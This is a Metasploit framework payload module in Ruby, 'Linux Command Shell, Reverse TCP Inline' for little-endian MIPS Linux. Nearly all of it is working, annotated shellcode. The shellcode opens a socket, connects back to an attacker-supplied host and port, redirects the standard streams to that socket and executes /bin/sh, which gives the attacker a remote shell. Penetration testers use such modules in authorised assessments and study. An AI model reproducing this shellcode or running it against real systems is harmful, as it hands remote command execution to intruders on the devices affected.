##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module MetasploitModule

  CachedSize = 184

  include Msf::Payload::Single
  include Msf::Payload::Linux
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Linux Command Shell, Reverse TCP Inline',
      'Description'   => 'Connect back to attacker and spawn a command shell',
      'Author'        =>
        [
          'rigan <imrigan[at]gmail.com>', # Original (mipsbe) shellcode
          'juan vazquez' # Metasploit module
        ],
      'License'       => MSF_LICENSE,
      'Platform'      => 'linux',
      'Arch'          => ARCH_MIPSLE,
      'Handler'       => Msf::Handler::ReverseTcp,
      'Session'       => Msf::Sessions::CommandShellUnix,
      'Payload'       =>
        {
          'Offsets' => { },
          'Payload' => ''
        })
    )
  end

  def generate
    if( !datastore['LHOST'] or datastore['LHOST'].empty? )
      return super
    end

    host = Rex::Socket.addr_atoi(datastore['LHOST'])
    port = Integer(datastore['LPORT'])

    host = [host].pack("N").unpack("cccc")
    port = [port].pack("n").unpack("cc")

    shellcode =
      # sys_socket
      # a0: domain
      # a1: type
      # a2: protocol
      "\xfa\xff\x0f\x24" + # li t7,-6
      "\x27\x78\xe0\x01" + # nor t7,t7,zero
      "\xfd\xff\xe4\x21" + # addi a0,t7,-3
      "\xfd\xff\xe5\x21" + # addi a1,t7,-3
      "\xff\xff\x06\x28" + # slti a2,zero,-1
      "\x57\x10\x02\x24" + # li v0,4183 # sys_socket
      "\x0c\x01\x01\x01" + # syscall 0x40404

      # sys_connect
      # a0: sockfd (stored on the stack)
      # a1: addr (data stored on the stack)
      # a2: addrlen
      "\xff\xff\xa2\xaf" + # sw v0,-1(sp)
      "\xff\xff\xa4\x8f" + # lw a0,-1(sp)
      "\xfd\xff\x0f\x34" + # li t7,0xfffd
      "\x27\x78\xe0\x01" + # nor t7,t7,zero
      "\xe2\xff\xaf\xaf" + # sw t7,-30(sp)
      port.pack("C2") + "\x0e\x3c" + # lui t6,0x1f90
      port.pack("C2") + "\xce\x35" + # ori t6,t6,0x1f90
      "\xe4\xff\xae\xaf" + # sw t6,-28(sp)
      host[2..3].pack("C2") + "\x0e\x3c" + # lui t6,0x7f01
      host[0..1].pack("C2") + "\xce\x35" + # ori t6,t6,0x101
      "\xe6\xff\xae\xaf" + # sw t6,-26(sp)
      "\xe2\xff\xa5\x27" + # addiu a1,sp,-30
      "\xef\xff\x0c\x24" + # li t4,-17
      "\x27\x30\x80\x01" + # nor a2,t4,zero
      "\x4a\x10\x02\x24" + # li v0,4170  # sys_connect
      "\x0c\x01\x01\x01" + # syscall 0x40404

      # sys_dup2
      # a0: oldfd (socket)
      # a1: newfd (0, 1, 2)
      "\xfd\xff\x11\x24" + # li s1,-3
      "\x27\x88\x20\x02" + # nor s1,s1,zero
      "\xff\xff\xa4\x8f" + # lw a0,-1(sp)
      "\x21\x28\x20\x02" + # move a1,s1 # dup2_loop
      "\xdf\x0f\x02\x24" + # li v0,4063 # sys_dup2
      "\x0c\x01\x01\x01" + # syscall 0x40404
      "\xff\xff\x10\x24" + # li s0,-1
      "\xff\xff\x31\x22" + # addi s1,s1,-1
      "\xfa\xff\x30\x16" + # bne s1,s0,68 <dup2_loop>

      # sys_execve
      # a0: filename (stored on the stack) "//bin/sh"
      # a1: argv "//bin/sh"
      # a2: envp (null)
      "\xff\xff\x06\x28" + # slti a2,zero,-1
      "\x62\x69\x0f\x3c" + # lui t7,0x2f2f "bi"
      "\x2f\x2f\xef\x35" + # ori t7,t7,0x6269 "//"
      "\xec\xff\xaf\xaf" + # sw t7,-20(sp)
      "\x73\x68\x0e\x3c" + # lui t6,0x6e2f "sh"
      "\x6e\x2f\xce\x35" + # ori t6,t6,0x7368 "n/"
      "\xf0\xff\xae\xaf" + # sw t6,-16(sp)
      "\xf4\xff\xa0\xaf" + # sw zero,-12(sp)
      "\xec\xff\xa4\x27" + # addiu a0,sp,-20
      "\xf8\xff\xa4\xaf" + # sw a0,-8(sp)
      "\xfc\xff\xa0\xaf" + # sw zero,-4(sp)
      "\xf8\xff\xa5\x27" + # addiu a1,sp,-8
      "\xab\x0f\x02\x24" + # li v0,4011 # sys_execve
      "\x0c\x01\x01\x01"  # syscall 0x40404

    return super + shellcode
  end
end
